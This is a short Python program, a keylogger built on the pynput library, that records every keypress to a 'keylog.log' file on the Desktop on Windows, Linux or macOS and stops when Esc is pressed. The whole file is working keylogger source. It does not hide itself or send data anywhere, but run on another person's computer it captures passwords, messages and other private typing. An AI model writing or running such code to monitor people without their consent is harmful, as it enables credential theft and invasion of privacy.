import os
import sys
import logging
import platform

from pynput import keyboard

def on_key_press(key):
    try:
        # Get the platform (Windows, Linux, macOS)
        system = platform.system()

        # Define the log file path based on the operating system
        if system == "Windows":
            desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
            log_file = os.path.join(desktop_path, "keylog.log")
        elif system == "Linux" or system == "Darwin":
            desktop_path = os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop')
            log_file = os.path.join(desktop_path, "keylog.log")
        else:
            print("Unsupported operating system.")
            sys.exit(1)

        # Get the key in string format
        key_str = str(key)

        # Filter out special keys like "Key.shift_r" and "Key.space"
        if len(key_str) == 3 and key_str.startswith("'") and key_str.endswith("'"):
            key_str = key_str[1]

        # Append the key to the log file
        with open(log_file, "a") as f:
            f.write(key_str + "\n")

    except Exception as e:
        print(f"Error: {e}")

def on_key_release(key):
    # Stop the keylogger if the escape key is pressed
    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    try:
        # Configure the logger
        logging.basicConfig(filename=os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop', "keylog.log"),
                            level=logging.INFO, format="%(asctime)s [%(levelname)s]: %(message)s")

        # Start the keylogger
        with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
            logging.info("Keylogger started. Press 'Esc' to stop.")
            listener.join()

    except KeyboardInterrupt:
        logging.info("Keylogger stopped.")
